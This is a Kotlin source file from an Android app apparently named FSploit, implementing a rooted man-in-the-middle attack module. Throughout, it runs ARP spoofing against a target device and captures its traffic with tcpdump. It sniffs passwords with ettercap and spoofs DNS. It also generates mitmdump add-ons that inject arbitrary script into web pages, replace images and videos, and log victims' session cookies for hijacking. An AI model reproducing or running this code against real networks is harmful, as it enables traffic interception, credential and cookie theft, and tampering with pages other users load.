package org.fsploit.android.data.mitm

import android.content.Context
import org.fsploit.android.R
import org.fsploit.android.core.ResourceProvider
import org.fsploit.android.data.shell.ShellRepository
import org.fsploit.android.domain.model.ConnectionBlockResult
import org.fsploit.android.domain.model.MitmActionResult
import org.fsploit.android.domain.model.MitmLaunchRequest
import org.fsploit.android.domain.model.MitmMode
import org.fsploit.android.domain.model.MitmReadiness
import org.fsploit.android.domain.model.MitmSession
import org.fsploit.android.domain.model.ShellStatus
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.Inet4Address
import java.net.InetAddress
import java.net.URL
import java.util.Properties

class MitmRepository(
    context: Context,
    private val resourceProvider: ResourceProvider,
    private val shellRepository: ShellRepository
) {
    private val appContext = context.applicationContext
    private val mitmRootDirectory = File(appContext.filesDir, "mitm").apply { mkdirs() }
    private val sessionFile = File(mitmRootDirectory, SESSION_FILE_NAME)

    fun loadReadiness(shellStatus: ShellStatus): MitmReadiness {
        if (!shellStatus.rootGranted) {
            return MitmReadiness(
                iptablesAvailable = false,
                tcpdumpAvailable = false,
                arpspoofAvailable = false,
                ettercapAvailable = false,
                mitmdumpAvailable = false,
                certificateStoreAccessible = false,
                summary = resourceProvider.getString(R.string.mitm_root_required)
            )
        }

        val iptablesAvailable = commandExists("iptables", "iptables-legacy", "iptables-nft")
        val tcpdumpAvailable = commandExists("tcpdump")
        val arpspoofAvailable = commandExists("arpspoof")
        val ettercapAvailable = commandExists("ettercap")
        val mitmdumpAvailable = commandExists("mitmdump")
        val certificateStoreAccessible = directoryAccessible(
            "/system/etc/security/cacerts"
        ) || directoryAccessible(
            "/apex/com.android.conscrypt/cacerts"
        )

        val summary = when {
            !iptablesAvailable -> resourceProvider.getString(R.string.mitm_missing_iptables)
            !arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
            !tcpdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_tcpdump)
            !ettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_ettercap)
            !mitmdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_mitmdump)
            !certificateStoreAccessible -> resourceProvider.getString(R.string.mitm_missing_ca_store)
            else -> resourceProvider.getString(R.string.mitm_ready)
        }

        return MitmReadiness(
            iptablesAvailable = iptablesAvailable,
            tcpdumpAvailable = tcpdumpAvailable,
            arpspoofAvailable = arpspoofAvailable,
            ettercapAvailable = ettercapAvailable,
            mitmdumpAvailable = mitmdumpAvailable,
            certificateStoreAccessible = certificateStoreAccessible,
            summary = summary
        )
    }

    fun loadSession(): MitmSession {
        if (!sessionFile.exists()) {
            return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        }

        val properties = loadSessionProperties() ?: return MitmSession(
            summary = resourceProvider.getString(R.string.mitm_session_idle)
        )
        val pids = properties.getProperty(KEY_PIDS)
            .orEmpty()
            .split(',')
            .mapNotNull { it.trim().toLongOrNull() }
        val active = pids.isNotEmpty() && pids.any(::isProcessAlive)

        if (!active) {
            sessionFile.delete()
            return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        }

        return MitmSession(
            active = true,
            mode = properties.getProperty(KEY_MODE)
                ?.let { value -> MitmMode.entries.firstOrNull { it.name == value } },
            targetHost = properties.getProperty(KEY_TARGET_HOST).orEmpty(),
            interfaceName = properties.getProperty(KEY_INTERFACE).orEmpty(),
            summary = properties.getProperty(KEY_SUMMARY).orEmpty(),
            logPath = properties.getProperty(KEY_LOG_PATH).orEmpty(),
            artifactPath = properties.getProperty(KEY_ARTIFACT_PATH).orEmpty(),
            startedAtEpochMs = properties.getProperty(KEY_STARTED_AT)?.toLongOrNull() ?: 0L
        )
    }

    fun startSession(request: MitmLaunchRequest): MitmActionResult {
        val targetHost = validateIpv4(request.targetHost)
            ?: return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.block_invalid_host)
            )
        val interfaceName = request.interfaceName.trim()
        if (interfaceName.isEmpty()) {
            return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.mitm_interface_required)
            )
        }

        val readiness = loadReadiness(
            ShellStatus(
                shellAvailable = true,
                suAvailable = true,
                rootGranted = true,
                summary = ""
            )
        )
        val missingToolSummary = missingToolSummary(request.mode, readiness)
        if (missingToolSummary != null) {
            return MitmActionResult(success = false, summary = missingToolSummary)
        }

        stopSession()

        val startedAt = System.currentTimeMillis()
        val sessionDirectory = File(mitmRootDirectory, "session-$startedAt").apply { mkdirs() }
        val mainLogFile = File(sessionDirectory, "main.log")
        val arpLogFile = File(sessionDirectory, "arpspoof.log")
        val pidList = mutableListOf<Long>()
        var artifactPath = ""
        var redirectPort = 0
        var forwardingEnabled = false

        try {
            when (request.mode) {
                MitmMode.CONNECTION_KILL -> startConnectionKill(
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    sessionDirectory = sessionDirectory,
                    arpLogFile = arpLogFile,
                    pidList = pidList
                )

                MitmMode.SNIFFER -> {
                    artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
                    forwardingEnabled = true
                    startSniffer(
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        arpLogFile = arpLogFile,
                        mainLogFile = mainLogFile,
                        pidList = pidList
                    )
                }

                MitmMode.PASSWORD_SNIFFER -> {
                    artifactPath = File(sessionDirectory, "passwords.log").absolutePath
                    forwardingEnabled = true
                    startPasswordSniffer(
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        arpLogFile = arpLogFile,
                        pidList = pidList
                    )
                }

                MitmMode.DNS_SPOOF -> {
                    artifactPath = File(sessionDirectory, "etter.dns").absolutePath
                    forwardingEnabled = true
                    startDnsSpoof(
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        dnsRules = request.payloadValue,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        arpLogFile = arpLogFile,
                        mainLogFile = mainLogFile,
                        pidList = pidList
                    )
                }

                MitmMode.REDIRECT,
                MitmMode.IMAGE_REPLACE,
                MitmMode.VIDEO_REPLACE,
                MitmMode.SCRIPT_INJECTION,
                MitmMode.CUSTOM_FILTER,
                MitmMode.SESSION_HIJACK -> {
                    redirectPort = DEFAULT_HTTP_PROXY_PORT
                    forwardingEnabled = true
                    artifactPath = startHttpMitmMode(
                        request = request,
                        targetHost = targetHost,
                        interfaceName = interfaceName,
                        redirectPort = redirectPort,
                        sessionDirectory = sessionDirectory,
                        arpLogFile = arpLogFile,
                        mainLogFile = mainLogFile,
                        pidList = pidList
                    )
                }
            }
        } catch (exception: IllegalArgumentException) {
            cleanupSession(pidList, redirectPort, forwardingEnabled)
            return MitmActionResult(success = false, summary = exception.message.orEmpty())
        } catch (_: Exception) {
            cleanupSession(pidList, redirectPort, forwardingEnabled)
            return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.mitm_session_start_failed)
            )
        }

        val session = MitmSession(
            active = true,
            mode = request.mode,
            targetHost = targetHost,
            interfaceName = interfaceName,
            summary = resourceProvider.getString(
                R.string.mitm_session_running,
                resourceProvider.getString(request.mode.titleRes),
                targetHost
            ),
            logPath = if (request.mode == MitmMode.CONNECTION_KILL) {
                arpLogFile.absolutePath
            } else {
                mainLogFile.absolutePath
            },
            artifactPath = artifactPath,
            startedAtEpochMs = startedAt
        )
        saveSessionProperties(
            session = session,
            pids = pidList,
            redirectPort = redirectPort,
            forwardingEnabled = forwardingEnabled
        )

        return MitmActionResult(
            success = true,
            summary = session.summary,
            session = session
        )
    }

    fun stopSession(): MitmActionResult {
        if (!sessionFile.exists()) {
            return MitmActionResult(
                success = true,
                summary = resourceProvider.getString(R.string.mitm_session_idle),
                session = MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
            )
        }

        val properties = loadSessionProperties()
        val pids = properties?.getProperty(KEY_PIDS)
            .orEmpty()
            .split(',')
            .mapNotNull { it.trim().toLongOrNull() }
        val redirectPort = properties?.getProperty(KEY_REDIRECT_PORT)?.toIntOrNull() ?: 0
        val forwardingEnabled = properties?.getProperty(KEY_FORWARDING_ENABLED)?.toBoolean() == true
        cleanupSession(pids, redirectPort, forwardingEnabled)
        sessionFile.delete()

        return MitmActionResult(
            success = true,
            summary = resourceProvider.getString(R.string.mitm_session_stopped),
            session = MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        )
    }

    fun blockHost(hostAddress: String): ConnectionBlockResult {
        val host = validateIpv4(hostAddress)
            ?: return ConnectionBlockResult(
                targetHost = hostAddress,
                success = false,
                summary = resourceProvider.getString(R.string.block_invalid_host)
            )

        val result = shellRepository.execute(
            command = buildString {
                append("iptables -C OUTPUT -d ")
                append(host)
                append(" -j DROP 2>/dev/null || iptables -I OUTPUT -d ")
                append(host)
                append(" -j DROP; ")
                append("iptables -C INPUT -s ")
                append(host)
                append(" -j DROP 2>/dev/null || iptables -I INPUT -s ")
                append(host)
                append(" -j DROP")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )

        return ConnectionBlockResult(
            targetHost = host,
            success = result.exitCode == 0 && !result.timedOut,
            summary = if (result.exitCode == 0 && !result.timedOut) {
                resourceProvider.getString(R.string.block_applied, host)
            } else {
                resourceProvider.getString(R.string.block_failed, host, result.summary)
            }
        )
    }

    fun unblockHost(hostAddress: String): ConnectionBlockResult {
        val host = validateIpv4(hostAddress)
            ?: return ConnectionBlockResult(
                targetHost = hostAddress,
                success = false,
                summary = resourceProvider.getString(R.string.block_invalid_host)
            )

        val result = shellRepository.execute(
            command = buildString {
                append("while iptables -D OUTPUT -d ")
                append(host)
                append(" -j DROP 2>/dev/null; do :; done; ")
                append("while iptables -D INPUT -s ")
                append(host)
                append(" -j DROP 2>/dev/null; do :; done")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )

        return ConnectionBlockResult(
            targetHost = host,
            success = result.exitCode == 0 && !result.timedOut,
            summary = if (result.exitCode == 0 && !result.timedOut) {
                resourceProvider.getString(R.string.block_removed, host)
            } else {
                resourceProvider.getString(R.string.block_remove_failed, host, result.summary)
            }
        )
    }

    private fun startConnectionKill(
        interfaceName: String,
        targetHost: String,
        sessionDirectory: File,
        arpLogFile: File,
        pidList: MutableList<Long>
    ) {
        val gateway = resolveGateway(interfaceName)
            ?: throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
            )
        val arpPid = startDetachedProcess(
            name = "arpspoof",
            sessionDirectory = sessionDirectory,
            logFile = arpLogFile,
            body = buildArpspoofScript(interfaceName, targetHost, gateway)
        ) ?: throw IllegalArgumentException(
            resourceProvider.getString(R.string.mitm_session_start_failed)
        )
        pidList += arpPid
    }

    private fun startSniffer(
        interfaceName: String,
        targetHost: String,
        artifactPath: String,
        sessionDirectory: File,
        arpLogFile: File,
        mainLogFile: File,
        pidList: MutableList<Long>
    ) {
        val gateway = resolveGateway(interfaceName)
            ?: throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
            )
        setForwarding(true)
        val arpPid = startDetachedProcess(
            name = "arpspoof",
            sessionDirectory = sessionDirectory,
            logFile = arpLogFile,
            body = buildArpspoofScript(interfaceName, targetHost, gateway)
        )
        arpPid?.let(pidList::add)
        val tcpdumpPid = startDetachedProcess(
            name = "tcpdump",
            sessionDirectory = sessionDirectory,
            logFile = mainLogFile,
            body = buildTcpdumpScript(interfaceName, targetHost, artifactPath)
        )
        tcpdumpPid?.let(pidList::add)
        if (arpPid == null || tcpdumpPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startPasswordSniffer(
        interfaceName: String,
        targetHost: String,
        artifactPath: String,
        sessionDirectory: File,
        arpLogFile: File,
        pidList: MutableList<Long>
    ) {
        val gateway = resolveGateway(interfaceName)
            ?: throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
            )
        setForwarding(true)
        val arpPid = startDetachedProcess(
            name = "arpspoof",
            sessionDirectory = sessionDirectory,
            logFile = arpLogFile,
            body = buildArpspoofScript(interfaceName, targetHost, gateway)
        )
        arpPid?.let(pidList::add)
        val ettercapPid = startDetachedProcess(
            name = "ettercap-passwords",
            sessionDirectory = sessionDirectory,
            logFile = File(artifactPath),
            body = buildEttercapPasswordScript(interfaceName, targetHost)
        )
        ettercapPid?.let(pidList::add)
        if (arpPid == null || ettercapPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startDnsSpoof(
        interfaceName: String,
        targetHost: String,
        dnsRules: String,
        artifactPath: String,
        sessionDirectory: File,
        arpLogFile: File,
        mainLogFile: File,
        pidList: MutableList<Long>
    ) {
        val gateway = resolveGateway(interfaceName)
            ?: throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
            )
        if (dnsRules.trim().isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
        }
        File(artifactPath).writeText(dnsRules.trim() + "\n")
        setForwarding(true)
        val arpPid = startDetachedProcess(
            name = "arpspoof",
            sessionDirectory = sessionDirectory,
            logFile = arpLogFile,
            body = buildArpspoofScript(interfaceName, targetHost, gateway)
        )
        arpPid?.let(pidList::add)
        val ettercapPid = startDetachedProcess(
            name = "ettercap-dns",
            sessionDirectory = sessionDirectory,
            logFile = mainLogFile,
            body = buildEttercapDnsScript(interfaceName, targetHost, sessionDirectory)
        )
        ettercapPid?.let(pidList::add)
        if (arpPid == null || ettercapPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startHttpMitmMode(
        request: MitmLaunchRequest,
        targetHost: String,
        interfaceName: String,
        redirectPort: Int,
        sessionDirectory: File,
        arpLogFile: File,
        mainLogFile: File,
        pidList: MutableList<Long>
    ): String {
        val gateway = resolveGateway(interfaceName)
            ?: throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
            )
        val addonFile = File(sessionDirectory, "mitm_addon.py")
        val artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
            File(sessionDirectory, "cookies.jsonl").absolutePath
        } else {
            addonFile.absolutePath
        }
        addonFile.writeText(
            buildMitmdumpAddon(
                request = request,
                artifactPath = artifactPath
            )
        )

        val mitmdumpPid = startDetachedProcess(
            name = "mitmdump",
            sessionDirectory = sessionDirectory,
            logFile = mainLogFile,
            body = buildMitmdumpScript(addonFile, redirectPort)
        ) ?: throw IllegalArgumentException(
            resourceProvider.getString(R.string.mitm_session_start_failed)
        )
        pidList += mitmdumpPid
        setForwarding(true)
        applyPortRedirect(redirectPort)
        val arpPid = startDetachedProcess(
            name = "arpspoof",
            sessionDirectory = sessionDirectory,
            logFile = arpLogFile,
            body = buildArpspoofScript(interfaceName, targetHost, gateway)
        ) ?: throw IllegalArgumentException(
            resourceProvider.getString(R.string.mitm_session_start_failed)
        )
        pidList += arpPid
        return artifactPath
    }

    private fun cleanupSession(pids: List<Long>, redirectPort: Int, forwardingEnabled: Boolean) {
        pids.forEach { pid ->
            shellRepository.execute(
                command = "kill -2 $pid 2>/dev/null || kill -9 $pid 2>/dev/null || true",
                asRoot = true,
                timeoutMs = PROBE_TIMEOUT_MS
            )
        }
        if (redirectPort > 0) {
            shellRepository.execute(
                command = "while iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $redirectPort 2>/dev/null; do :; done",
                asRoot = true,
                timeoutMs = FIREWALL_TIMEOUT_MS
            )
        }
        if (forwardingEnabled) {
            setForwarding(false)
        }
    }

    private fun missingToolSummary(mode: MitmMode, readiness: MitmReadiness): String? {
        return when (mode) {
            MitmMode.CONNECTION_KILL ->
                if (!readiness.arpspoofAvailable) resourceProvider.getString(R.string.mitm_missing_arpspoof) else null

            MitmMode.SNIFFER ->
                when {
                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
                    !readiness.tcpdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_tcpdump)
                    else -> null
                }

            MitmMode.PASSWORD_SNIFFER,
            MitmMode.DNS_SPOOF ->
                when {
                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
                    !readiness.ettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_ettercap)
                    else -> null
                }

            MitmMode.REDIRECT,
            MitmMode.IMAGE_REPLACE,
            MitmMode.VIDEO_REPLACE,
            MitmMode.SCRIPT_INJECTION,
            MitmMode.CUSTOM_FILTER,
            MitmMode.SESSION_HIJACK ->
                when {
                    !readiness.arpspoofAvailable -> resourceProvider.getString(R.string.mitm_missing_arpspoof)
                    !readiness.iptablesAvailable -> resourceProvider.getString(R.string.mitm_missing_iptables)
                    !readiness.mitmdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_mitmdump)
                    else -> null
                }
        }
    }

    private fun buildArpspoofScript(interfaceName: String, targetHost: String, gateway: String): String {
        return "exec arpspoof -i ${shellQuote(interfaceName)} -t ${shellQuote(targetHost)} ${shellQuote(gateway)}\n"
    }

    private fun buildTcpdumpScript(interfaceName: String, targetHost: String, artifactPath: String): String {
        return "exec tcpdump -i ${shellQuote(interfaceName)} -n -s 0 host ${shellQuote(targetHost)} and not arp -w ${shellQuote(artifactPath)}\n"
    }

    private fun buildEttercapPasswordScript(interfaceName: String, targetHost: String): String {
        return "exec ettercap -Tpq -i ${shellQuote(interfaceName)} /${shellEscapeToken(targetHost)}// ///\n"
    }

    private fun buildEttercapDnsScript(
        interfaceName: String,
        targetHost: String,
        sessionDirectory: File
    ): String {
        return buildString {
            append("cd ")
            append(shellQuote(sessionDirectory.absolutePath))
            append(" || exit 1\n")
            append("exec ettercap -Tq -P dns_spoof -i ")
            append(shellQuote(interfaceName))
            append(" /")
            append(shellEscapeToken(targetHost))
            append("// ///\n")
        }
    }

    private fun buildMitmdumpScript(addonFile: File, redirectPort: Int): String {
        return buildString {
            append("exec mitmdump --mode transparent --showhost ")
            append("--set block_global=false ")
            append("--listen-host 0.0.0.0 ")
            append("--listen-port ")
            append(redirectPort)
            append(" -s ")
            append(shellQuote(addonFile.absolutePath))
            append('\n')
        }
    }

    private fun buildMitmdumpAddon(request: MitmLaunchRequest, artifactPath: String): String {
        return when (request.mode) {
            MitmMode.REDIRECT -> buildRedirectAddon(request)
            MitmMode.IMAGE_REPLACE -> buildImageReplaceAddon(request)
            MitmMode.VIDEO_REPLACE -> buildVideoReplaceAddon(request)
            MitmMode.SCRIPT_INJECTION -> buildScriptInjectionAddon(request)
            MitmMode.CUSTOM_FILTER -> buildCustomFilterAddon(request)
            MitmMode.SESSION_HIJACK -> buildSessionHijackAddon(artifactPath)
            else -> throw IllegalArgumentException(
                resourceProvider.getString(R.string.mitm_mode_not_supported)
            )
        }
    }

    private fun buildRedirectAddon(request: MitmLaunchRequest): String {
        val targetHost = normalizeHostInput(request.primaryValue)
        val targetPort = request.secondaryValue.trim().toIntOrNull()
            ?.takeIf { it in 1..65535 }
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_port_invalid))
        return """
from mitmproxy import http

TARGET_HOST = ${pythonLiteral(targetHost)}
TARGET_PORT = $targetPort

def request(flow: http.HTTPFlow) -> None:
    flow.request.scheme = "http"
    flow.request.host = TARGET_HOST
    flow.request.port = TARGET_PORT
    flow.request.headers["Host"] = TARGET_HOST
""".trimIndent()
    }

    private fun buildImageReplaceAddon(request: MitmLaunchRequest): String {
        val resourceUrl = normalizeUrlInput(request.primaryValue)
        return """
import re
from mitmproxy import http

RESOURCE = ${pythonLiteral(resourceUrl)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/css" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?i)<img([^/]+)src=(["\'])[^"\']+(["\'])', r'<img\1src=\2' + RESOURCE + r'\3', data)
    data = re.sub(r'(?i)background\s*(:|-)\s*url\s*[\(|:][^\);]+\)?.*', 'background: url(' + RESOURCE + ')', data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildVideoReplaceAddon(request: MitmLaunchRequest): String {
        val videoId = extractYoutubeVideoId(request.primaryValue.trim())
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_video_url_invalid))
        return """
import re
from mitmproxy import http

VIDEO_ID = ${pythonLiteral(videoId)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?s)/v=[a-zA-Z0-9_-]+', '/v=' + VIDEO_ID, data)
    data = re.sub(r'(?s)/v/[a-zA-Z0-9_-]+', '/v/' + VIDEO_ID, data)
    data = re.sub(r'(?s)/embed/[a-zA-Z0-9_-]+', '/embed/' + VIDEO_ID, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildScriptInjectionAddon(request: MitmLaunchRequest): String {
        val payload = request.payloadValue.trim()
        if (payload.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_script_required))
        }
        return """
import re
from mitmproxy import http

INJECTION = ${pythonLiteral(payload)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    updated = re.sub(r'(?i)</head>', INJECTION + '</head>', data, count=1)
    if updated == data:
        updated = INJECTION + data
    flow.response.set_text(updated)
""".trimIndent()
    }

    private fun buildCustomFilterAddon(request: MitmLaunchRequest): String {
        val rules = request.payloadValue.lines()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { line ->
                val separator = line.indexOf("=>")
                if (separator <= 0 || separator >= line.lastIndex) {
                    throw IllegalArgumentException(
                        resourceProvider.getString(R.string.mitm_filter_rule_invalid, line)
                    )
                }
                val pattern = line.substring(0, separator).trim()
                val replacement = line.substring(separator + 2).trim()
                Regex(pattern)
                pattern to replacement
            }
        if (rules.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rules_required))
        }
        val pythonRules = rules.joinToString(",\n") { (pattern, replacement) ->
            "    (${pythonLiteral(pattern)}, ${pythonLiteral(replacement)})"
        }
        return """
import re
from mitmproxy import http

REPLACEMENTS = [
$pythonRules
]

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/plain" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    for pattern, replacement in REPLACEMENTS:
        data = re.sub(pattern, replacement, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildSessionHijackAddon(artifactPath: String): String {
        return """
import json
import time
from mitmproxy import http

COOKIE_LOG = ${pythonLiteral(artifactPath)}

def request(flow: http.HTTPFlow) -> None:
    cookie = flow.request.headers.get("Cookie")
    if not cookie:
        return
    record = {
        "timestamp": time.time(),
        "host": flow.request.pretty_host,
        "path": flow.request.path,
        "cookie": cookie,
        "user_agent": flow.request.headers.get("User-Agent", "")
    }
    with open(COOKIE_LOG, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(record, ensure_ascii=False) + "\n")
""".trimIndent()
    }

    private fun startDetachedProcess(
        name: String,
        sessionDirectory: File,
        logFile: File,
        body: String
    ): Long? {
        val scriptFile = File(sessionDirectory, "$name.sh")
        scriptFile.writeText("#!/system/bin/sh\n$body")
        val result = shellRepository.execute(
            command = buildString {
                append("chmod 700 ")
                append(shellQuote(scriptFile.absolutePath))
                append("; nohup sh ")
                append(shellQuote(scriptFile.absolutePath))
                append(" >> ")
                append(shellQuote(logFile.absolutePath))
                append(" 2>&1 < /dev/null & echo $!")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
        if (result.exitCode != 0 || result.timedOut) {
            return null
        }
        return result.output.lineSequence()
            .map { it.trim() }
            .lastOrNull { it.isNotEmpty() }
            ?.toLongOrNull()
    }

    private fun applyPortRedirect(port: Int) {
        shellRepository.execute(
            command = "iptables -t nat -C PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port 2>/dev/null || iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port",
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
    }

    private fun setForwarding(enabled: Boolean) {
        shellRepository.execute(
            command = "echo ${if (enabled) 1 else 0} > /proc/sys/net/ipv4/ip_forward",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
    }

    private fun resolveGateway(interfaceName: String): String? {
        val result = shellRepository.execute(
            command = "ip route show | while read -r a b c d e f rest; do if [ \"\$a\" = default ] && [ \"\$e\" = ${shellQuote(interfaceName)} ]; then echo \"\$c\"; break; fi; done",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
        val gateway = result.output.lineSequence()
            .map { it.trim() }
            .firstOrNull { it.isNotEmpty() }
        return validateIpv4(gateway.orEmpty())
    }

    private fun saveSessionProperties(
        session: MitmSession,
        pids: List<Long>,
        redirectPort: Int,
        forwardingEnabled: Boolean
    ) {
        val properties = Properties().apply {
            setProperty(KEY_MODE, session.mode?.name.orEmpty())
            setProperty(KEY_TARGET_HOST, session.targetHost)
            setProperty(KEY_INTERFACE, session.interfaceName)
            setProperty(KEY_SUMMARY, session.summary)
            setProperty(KEY_LOG_PATH, session.logPath)
            setProperty(KEY_ARTIFACT_PATH, session.artifactPath)
            setProperty(KEY_STARTED_AT, session.startedAtEpochMs.toString())
            setProperty(KEY_PIDS, pids.joinToString(","))
            setProperty(KEY_REDIRECT_PORT, redirectPort.toString())
            setProperty(KEY_FORWARDING_ENABLED, forwardingEnabled.toString())
        }
        FileOutputStream(sessionFile).use { stream ->
            properties.store(stream, "FSploit MITM session")
        }
    }

    private fun loadSessionProperties(): Properties? {
        if (!sessionFile.exists()) {
            return null
        }
        return Properties().apply {
            FileInputStream(sessionFile).use { stream -> load(stream) }
        }
    }

    private fun isProcessAlive(pid: Long): Boolean {
        val result = shellRepository.execute(
            command = "kill -0 $pid",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
        return result.exitCode == 0 && !result.timedOut
    }

    private fun commandExists(vararg commands: String): Boolean {
        return commands.any { command ->
            val result = shellRepository.execute(
                command = "command -v $command",
                asRoot = true,
                timeoutMs = PROBE_TIMEOUT_MS
            )
            result.exitCode == 0 && result.output.isNotBlank()
        }
    }

    private fun directoryAccessible(path: String): Boolean {
        val result = shellRepository.execute(
            command = "[ -d \"$path\" ] && echo ok",
            asRoot = true,
            timeoutMs = PROBE_TIMEOUT_MS
        )
        return result.exitCode == 0 && result.output.contains("ok")
    }

    private fun validateIpv4(hostAddress: String): String? {
        return try {
            val address = InetAddress.getByName(hostAddress.trim())
            if (address is Inet4Address) address.hostAddress else null
        } catch (_: Exception) {
            null
        }
    }

    private fun normalizeUrlInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).toString()
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_url_invalid))
        }
    }

    private fun normalizeHostInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).host.orEmpty().ifBlank {
                throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
            }
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
        }
    }

    private fun extractYoutubeVideoId(value: String): String? {
        val pattern = Regex("(?:v=|/v/|/embed/|youtu\\.be/)([A-Za-z0-9_-]{6,})")
        return pattern.find(value)?.groupValues?.getOrNull(1)
    }

    private fun pythonLiteral(value: String): String {
        val escaped = buildString {
            value.forEach { character ->
                when (character) {
                    '\\' -> append("\\\\")
                    '\'' -> append("\\'")
                    '\n' -> append("\\n")
                    '\r' -> append("\\r")
                    '\t' -> append("\\t")
                    else -> append(character)
                }
            }
        }
        return "'$escaped'"
    }

    private fun shellQuote(value: String): String {
        return "'" + value.replace("'", "'\"'\"'") + "'"
    }

    private fun shellEscapeToken(value: String): String {
        return value.replace("/", "")
    }

    companion object {
        private const val SESSION_FILE_NAME = "active_session.properties"
        private const val KEY_MODE = "mode"
        private const val KEY_TARGET_HOST = "target_host"
        private const val KEY_INTERFACE = "interface"
        private const val KEY_SUMMARY = "summary"
        private const val KEY_LOG_PATH = "log_path"
        private const val KEY_ARTIFACT_PATH = "artifact_path"
        private const val KEY_STARTED_AT = "started_at"
        private const val KEY_PIDS = "pids"
        private const val KEY_REDIRECT_PORT = "redirect_port"
        private const val KEY_FORWARDING_ENABLED = "forwarding_enabled"
        private const val DEFAULT_HTTP_PROXY_PORT = 18080
        private const val PROBE_TIMEOUT_MS = 2000L
        private const val FIREWALL_TIMEOUT_MS = 4000L
    }
}
